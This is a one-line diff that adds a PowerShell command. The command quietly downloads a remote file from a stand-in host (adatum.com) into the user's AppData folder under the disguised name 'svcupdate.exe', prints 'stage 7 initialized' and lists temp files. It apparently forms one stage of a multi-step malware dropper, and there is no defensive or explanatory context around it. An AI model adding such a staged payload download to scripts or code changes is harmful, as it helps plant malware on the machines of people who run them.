@@ -1,0 +1,1 @@
+$RemoteUrl = 'http://adatum.com/update.dat'; $PayloadPath = "$env:APPDATA\svcupdate.exe"; curl.exe -s -L -o $PayloadPath $RemoteUrl; Write-Output "stage 7 initialized"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
